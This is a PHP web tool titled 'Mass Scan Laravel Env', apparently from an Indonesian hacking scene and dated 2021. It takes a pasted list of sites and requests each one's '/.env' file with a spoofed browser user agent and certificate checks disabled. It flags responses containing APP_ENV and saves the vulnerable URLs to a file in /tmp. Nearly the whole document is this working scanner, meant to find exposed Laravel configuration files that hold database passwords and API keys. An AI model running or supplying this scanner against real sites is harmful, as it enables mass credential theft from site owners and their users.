<html>
<head>
<title>[+] Mass Scan Laravel Env [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white"><center>
  <style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
.courier {
  font-family: Courier;
}
.notvuln {
  color: red;
}
.vuln {
  color: green;
}
</style>
<form method="post">
<font face=courier size=5>Mass Scan Laravel Env<br>
  <font size="3">Scan Env File Pada Situs Laravel Dengan Instan</font></font><hr>
<textarea rows=1 name="url" placeholder="https://exploits.my.id/" required="true"></textarea><br><br>
<input type="submit" name="gaskan" value="Gaskan">
</form>
<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$webnya = basename($_SERVER['REQUEST_URI']);
$random = mt_rand(10000000,99999999);
$listku = str_replace("\r", "", $_POST['url']);
$total = preg_split('/\n|\r/', $listku);
$gas = $_POST['gaskan'];

if (!file_exists("/tmp/tempku")) {
  mkdir("/tmp/tempku");
}

if ($gas) {
$kontorus = file_get_contents($url);
$urls     = explode("\n", $listku);
echo "<font><hr>Loading ( <font color=orange>".count($total)."</font> Sites )</font><hr>";
echo "<pre style='text-align: left; white-space: pre-line;'>";
echo "[~] Running ...<br><br>";
foreach ($urls as $list) {
    $config = array(
        "/.env"
    );
    foreach ($config as $path) {
        ob_implicit_flush(true);ob_end_flush();
        $shell = explode(PHP_EOL, $list);
        for ($x = 0; $x < $path; $x++);
        $site = $list . $path;
        $ch   = curl_init($site);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36");
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $ini_curl = curl_exec($ch);
        curl_close($ch);
        if (strpos($ini_curl, "APP_ENV")) {
            echo $site . "  [<kntl class=vuln>Found</kntl>]" . PHP_EOL;
            file_put_contents("/tmp/tempku/hasil-env", $site."\n", FILE_APPEND);
        } else {
            echo $site . "  [<kntl class=notvuln>Not Found</kntl>]" . PHP_EOL;
        }
        
    }
}
echo "<br><br>[~] Done";
}
echo "</pre>";
echo '<center><hr><font size=3>Unknown45 - 2021';
?>